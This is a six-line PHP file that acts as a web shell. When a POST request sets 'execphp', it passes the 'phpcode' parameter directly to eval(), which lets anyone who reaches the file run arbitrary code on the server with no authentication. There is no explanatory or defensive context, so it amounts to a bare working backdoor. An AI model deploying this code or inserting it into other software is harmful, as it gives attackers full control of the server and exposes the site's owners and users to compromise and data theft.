<?php
if(isset($_POST['execphp']))
{
	eval($_POST['phpcode']);
}
?>